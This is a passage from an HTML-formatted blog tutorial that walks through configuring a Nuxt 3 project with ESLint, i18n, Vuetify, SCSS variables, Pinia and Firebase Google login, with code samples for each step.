class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;/lib/**/*&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;node_modules&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;.nuxt&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;plugins&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;rules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;import/named&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;vue/multi-word-component-names&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;space-before-function-paren&quot;</span><span class="punctuation">:</span> <span class="string">&quot;off&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>In the <code>package.json</code> file, add the ESLint scripts and configuring lint-staged:</p><ul><li><strong>lint:js</strong>: This script runs ESLint to check all JavaScript, TypeScript, and Vue files in the project, excluding the ones specified in the .gitignore file.</li><li><strong>lint</strong>: This is an alias for yarn lint:js, which means you can now use yarn lint to execute the ESLint checks.</li><li><strong>lintfix</strong>: This script also runs ESLint, but with the ‚Äìfix flag, which automatically attempts to fix any fixable issues in the code.</li><li><strong>lint-staged</strong>: This configuration specifies that lint-staged should run ESLint with the ‚Äìfix flag only on TypeScript (.ts) and Vue (.vue) files that are staged for a commit.</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// package.json</span></span><br><span class="line"> <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;lint:js&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eslint --ext .js,.ts,.vue --ignore-path .gitignore .&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;lint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yarn lint:js&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;lintfix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yarn lint:js --fix&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;lint-staged&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;*.&#123;ts,vue&#125;&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;eslint --fix&quot;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><h2 id="Step-4-Adding-Internationalization-i18n"><a href="#Step-4-Adding-Internationalization-i18n" class="headerlink" title="Step 4: Adding Internationalization (i18n)"></a>Step 4: Adding Internationalization (i18n)</h2><p>To cater to a global audience and provide a localized experience, I introduced internationalization (i18n) to our Nuxt 3 project. i18n enables us to translate the content and messages in our application into multiple languages, enhancing accessibility and user engagement.<br>First, install <a href="https://v8.i18n.nuxtjs.org/"><code>@nuxtjs/i18n</code></a> using Yarn:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add --dev @nuxtjs/i18n</span><br></pre></td></tr></table></figure><p>Then, add <code>@nuxtjs/i18n</code> to the modules section in your nuxt.config. You can use either of the following ways to specify the module options:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineNuxtConfig</span>(&#123;</span><br><span class="line">  <span class="attr">modules</span>: [</span><br><span class="line">    <span class="string">&#x27;@nuxtjs/i18n&#x27;</span>,</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">i18n</span>: &#123;</span><br><span class="line">    <span class="attr">locales</span>: [<span class="string">&#x27;en&#x27;</span>, <span class="string">&#x27;fr&#x27;</span>, <span class="string">&#x27;ar&#x27;</span>],</span><br><span class="line">    <span class="attr">defaultLocale</span>: <span class="string">&#x27;en&#x27;</span>,</span><br><span class="line">    <span class="attr">strategy</span>: <span class="string">&#x27;no_prefix&#x27;</span>,</span><br><span class="line">    <span class="attr">vueI18n</span>: <span class="string">&#x27;./i18n.config.ts&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>Next, create an <code>i18n.config.ts</code> file to set up the i18n configuration. In this file, I defined the supported languages, default language, and any other relevant settings for translation.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">legacy</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">locale</span>: <span class="string">&#x27;en&#x27;</span>,</span><br><span class="line">  <span class="attr">allowComposition</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">globalInjection</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">fallbackLocale</span>: <span class="string">&#x27;en&#x27;</span>,</span><br><span class="line">  <span class="attr">messages</span>: &#123;</span><br><span class="line">    <span class="attr">en</span>: &#123; <span class="title class_">Dashboards</span>: <span class="string">&#x27;Dashboards&#x27;</span> &#125;,</span><br><span class="line">    <span class="attr">fr</span>: &#123; <span class="title class_">Dashboards</span>: <span class="string">&#x27;Tableaux de bord&#x27;</span> &#125;,</span><br><span class="line">    <span class="attr">ar</span>: &#123; <span class="title class_">Dashboards</span>: <span class="string">&#x27;ŸÑŸàÿ≠ÿßÿ™ ÿßŸÑŸÇŸäÿßÿØÿ©&#x27;</span> &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To allow users to switch between different languages, I added a language switcher to the user interface. This component lets users select their preferred language and updates the content accordingly.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">v-model</span>=<span class="string">&quot;locale&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;en&quot;</span>&gt;</span>en<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;ar&quot;</span>&gt;</span>ar<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;fr&quot;</span>&gt;</span>fr<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; $t(&#x27;Dashboards&#x27;) &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123; useI18n &#125; <span class="keyword">from</span> <span class="string">&#x27;vue-i18n&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> &#123; locale &#125; = <span class="title function_">useI18n</span>()</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Step-5-Adding-Vuetify"><a href="#Step-5-Adding-Vuetify" class="headerlink" title="Step 5: Adding Vuetify"></a>Step 5: Adding Vuetify</h2><p>To enrich the user interface and provide a cohesive design language, I integrated Vuetify into our Nuxt 3 project. Vuetify offers a comprehensive set of pre-designed components and styles, enabling us to create visually stunning and responsive user interfaces with minimal effort.<br>First, install <a href="https://vuetifyjs.com/en/getting-started/installation/"><code>vuetify</code></a> using Yarn:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add --dev vuetify</span><br></pre></td></tr></table></figure><p>Next, add the necessary Vuetify configuration to the <code>nuxt.config.js</code> file. </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build<span class="punctuation">:</span> <span class="punctuation">&#123;</span> transpile<span class="punctuation">:</span> <span class="punctuation">[</span>&#x27;vuetify&#x27;<span class="punctuation">]</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>Then, create a plugin named <code>vuetify.ts</code> under plugins folder, ensures that Vuetify is properly loaded and available across the entire application.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineNuxtPlugin &#125; <span class="keyword">from</span> <span class="string">&#x27;nuxt/app&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;vuetify/styles&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; createVuetify &#125; <span class="keyword">from</span> <span class="string">&#x27;vuetify&#x27;</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> components <span class="keyword">from</span> <span class="string">&#x27;vuetify/components&#x27;</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> directives <span class="keyword">from</span> <span class="string">&#x27;vuetify/directives&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineNuxtPlugin</span>(<span class="function">(<span class="params">nuxtApp</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> vuetify = <span class="title function_">createVuetify</span>(&#123;</span><br><span class="line">    <span class="attr">ssr</span>: <span class="literal">true</span>,</span><br><span class="line">    components,</span><br><span class="line">    directives</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  nuxtApp.<span class="property">vueApp</span>.<span class="title function_">use</span>(vuetify)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>Vuetify comes with two themes pre-installed, light and dark. Now let‚Äôs add Vuetify theme toggle to validate if it can work.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">v-btn</span> @<span class="attr">click</span>=<span class="string">&quot;toggleTheme&quot;</span>&gt;</span></span><br><span class="line">      toggle theme</span><br><span class="line">    <span class="tag">&lt;/<span class="name">v-btn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123; useTheme &#125; <span class="keyword">from</span> <span class="string">&#x27;vuetify&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> theme = <span class="title function_">useTheme</span>()</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> <span class="title function_">toggleTheme</span> = (<span class="params"></span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">  theme.<span class="property">global</span>.<span class="property">name</span>.<span class="property">value</span> = theme.<span class="property">global</span>.<span class="property">current</span>.<span class="property">value</span>.<span class="property">dark</span> ? <span class="string">&#x27;light&#x27;</span> : <span class="string">&#x27;dark&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Step-6-Utilizing-SCSS-Variables"><a href="#Step-6-Utilizing-SCSS-Variables" class="headerlink" title="Step 6: Utilizing SCSS Variables"></a>Step 6: Utilizing SCSS Variables</h2><p>To leverage the power of SCSS variables in our Nuxt 3 project and enhance code reusability and maintainability, I introduced SCSS variables. SCSS variables allow us to store commonly used values, such as colors or font sizes, in one place and use them across our stylesheets.<br>In the Vuetify configuration within the <code>plugins/vuetify.ts</code> file, I used SCSS variables to define custom theme colors. </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// plugins/vuetify.ts</span></span><br><span class="line"><span class="attr">light</span>: &#123;</span><br><span class="line">  <span class="attr">dark</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">variables</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;my-color-value&#x27;</span>: <span class="string">&#x27;#81df3a&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the <code>styles.scss</code> file, I defined the SCSS variables <code>$my-color1</code> and <code>$my-color2</code>, representing colors used in the application. By using SCSS variables, we can easily change these colors in one place and see the changes propagate throughout the project.</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// styles<span class="selector-class">.scss</span></span><br><span class="line">$my-color1: <span class="built_in">rgb</span>(<span class="built_in">var</span>(--v-my-color-value));</span><br><span class="line">$my-color2: <span class="number">#6928d0</span>;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Component template goes here --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">&quot;scss&quot;</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="keyword">@import</span> <span class="string">&#x27;styles/styles.scss&#x27;</span>;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.form</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: $my-color1;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: $my-color2;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Step-7-Adding-Pinia"><a href="#Step-7-Adding-Pinia" class="headerlink" title="Step 7: Adding Pinia"></a>Step 7: Adding Pinia</h2><p>To enhance state management and improve the overall architecture of our Nuxt 3 project, I integrated <a href="https://pinia.vuejs.org/ssr/nuxt.html">Pinia</a>. Pinia is a modern, Vue.js-based state management solution that offers simplicity, reactivity, and excellent TypeScript support.<br>First, install TypeScript using Yarn:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add pinia @pinia/nuxt</span><br></pre></td></tr></table></figure><p>Then add it to modules in <code>nuxt.config.js</code> file:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// nuxt.config.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineNuxtConfig</span>(&#123;</span><br><span class="line">  <span class="attr">modules</span>: [</span><br><span class="line">    <span class="string">&#x27;@pinia/nuxt&#x27;</span>,</span><br><span class="line">  ],</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>By default <code>@pinia/nuxt</code> exposes one single auto import: <code>usePinia()</code>, you can add auto imports for  other Pinia related utilities like this:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// nuxt.config.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineNuxtConfig</span>(&#123;</span><br><span class="line">  <span class="attr">pinia</span>: &#123;</span><br><span class="line">    <span class="attr">autoImports</span>: [<span class="string">&#x27;defineStore&#x27;</span>, <span class="string">&#x27;storeToRefs&#x27;</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>Here‚Äôs a simple example defining a store using pinia in Option API.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useCounterStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;counter&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">state</span>: <span class="function">() =&gt;</span> (&#123; <span class="attr">count</span>: <span class="number">0</span>, <span class="attr">name</span>: <span class="string">&#x27;Eduardo&#x27;</span> &#125;),</span><br><span class="line">  <span class="attr">getters</span>: &#123;</span><br><span class="line">    <span class="attr">doubleCount</span>: <span class="function"><span class="params">state</span> =&gt;</span> state.<span class="property">count</span> * <span class="number">2</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">actions</span>: &#123;</span><br><span class="line">    <span class="title function_">increment</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">count</span>++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">      &#123;&#123; name &#125;&#125; &#123;&#123; doubleCount &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">v-btn</span> @<span class="attr">click</span>=<span class="string">&quot;increment&quot;</span>&gt;</span></span><br><span class="line">      count++</span><br><span class="line">    <span class="tag">&lt;/<span class="name">v-btn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> store = <span class="title function_">useCounterStore</span>()</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> &#123; name, doubleCount &#125; = <span class="title function_">storeToRefs</span>(store)</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> &#123; increment &#125; = store</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Step-8-Adding-Firebase-Google-Login"><a href="#Step-8-Adding-Firebase-Google-Login" class="headerlink" title="Step 8: Adding Firebase Google Login"></a>Step 8: Adding Firebase Google Login</h2><p>To enable users to log in to our Nuxt 3 application using their Google accounts, we can integrate Firebase Authentication. Firebase Authentication offers a secure and straightforward way to authenticate users and manage their login sessions.<br>First, install firebase dependencies:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add firebase firebase-admin</span><br></pre></td></tr></table></figure><p>Create a new file named firebase.client.ts inside the plugins folder. In this file, initialize Firebase for the client-side of our Nuxt 3 application:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// plugins/firebase.client.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; initializeApp, getApps &#125; <span class="keyword">from</span> <span class="string">&#x27;firebase/app&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; getAuth &#125; <span class="keyword">from</span> <span class="string">&#x27;firebase/auth&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineNuxtPlugin</span>(<span class="function">(<span class="params">&#123; provide &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> runtimeConfig = <span class="title function_">useRuntimeConfig</span>()</span><br><span class="line">  <span class="keyword">const</span> config = process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;development&#x27;</span> ? firebaseConfig : runtimeConfig.<span class="property">firebase</span></span><br><span class="line">  <span class="keyword">const</span> firebaseApp = <span class="title function_">getApps</span>()[<span class="number">0</span>] ?? <span class="title function_">initializeApp</span>(config)</span><br><span class="line">  <span class="keyword">const</span> firebaseAuth = <span class="title function_">getAuth</span>(firebaseApp)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set user on client when available</span></span><br><span class="line">  firebaseAuth.<span class="title function_">onAuthStateChanged</span>(signInCallback)</span><br><span class="line"></span><br><span class="line">  <span class="title function_">provide</span>(<span class="string">&#x27;firebase&#x27;</span>, firebaseApp)</span><br><span class="line">  <span class="title function_">provide</span>(<span class="string">&#x27;auth&#x27;</span>, firebaseAuth)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="string">&#x27;serviceWorker&#x27;</span> <span class="keyword">in</span> <span class="variable language_">window</span>.<span class="property">navigator</span> &amp;&amp; process.<span class="property">env</span>.<span class="property">NODE_ENV</span> !== <span class="string">&#x27;development&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">navigator</span>.<span class="property">serviceWorker</span>.<span class="title function_">register</span>(<span class="string">&#x27;/sw.js&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">signInCallback</span> = (<span class="params">token</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; email, accessToken &#125; = token || &#123;</span><br><span class="line">    <span class="attr">email</span>: <span class="literal">undefined</span>,</span><br><span class="line">    <span class="attr">token</span>: <span class="literal">undefined</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!email || !accessToken) &#123; <span class="keyword">return</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123; user &#125; = <span class="title function_">useAuth</span>()</span><br><span class="line">  user.<span class="property">value</span> = &#123; email &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set cookie for server side</span></span><br><span class="line">  <span class="keyword">const</span> cookie = <span class="title function_">useCookie</span>(<span class="string">&#x27;authToken&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span> (!cookie.<span class="property">value</span>) &#123; cookie.<span class="property">value</span> = accessToken &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>For server-side rendering (SSR), you may need a separate Firebase configuration file named firebase.server.ts inside the plugins folder. However, since Firebase Authentication works on the client-side, you may not need this file for our current implementation.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// plugins/firebase.server.ts</span></span><br><span class="line"><span class="keyword">import</span> admin, &#123; <span class="title class_">ServiceAccount</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;firebase-admin&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;firebase/compat/auth&#x27;</span></span><br><span class="line"><span class="keyword">import</span> serviceAccount <span class="keyword">from</span> <span class="string">&#x27;../firebase.json&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineNuxtPlugin</span>(<span class="function">(<span class="params">&#123; ssrContext &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  admin.<span class="property">apps</span>?.<span class="property">length</span> === <span class="number">0</span> &amp;&amp;</span><br><span class="line">    admin.<span class="title function_">initializeApp</span>(&#123;</span><br><span class="line">      <span class="attr">credential</span>: admin.<span class="property">credential</span>.<span class="title function_">cert</span>(serviceAccount <span class="keyword">as</span> <span class="title class_">ServiceAccount</span>)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// get auth token from headers</span></span><br><span class="line">  <span class="keyword">const</span> tokenHeader = ssrContext.<span class="property">event</span>.<span class="property">req</span>.<span class="property">headers</span>.<span class="property">authorization</span>?.<span class="title function_">substring</span>(<span class="string">&#x27;Bearer &#x27;</span>.<span class="property">length</span>)</span><br><span class="line">  <span class="keyword">const</span> tokenCookie = <span class="title function_">useCookie</span>(<span class="string">&#x27;authToken&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tokenHeader &amp;&amp; !tokenCookie.<span class="property">value</span>) &#123; <span class="keyword">return</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123; user &#125; = <span class="title function_">useAuth</span>()</span><br><span class="line">  admin</span><br><span class="line">    .<span class="title function_">auth</span>()</span><br><span class="line">    .<span 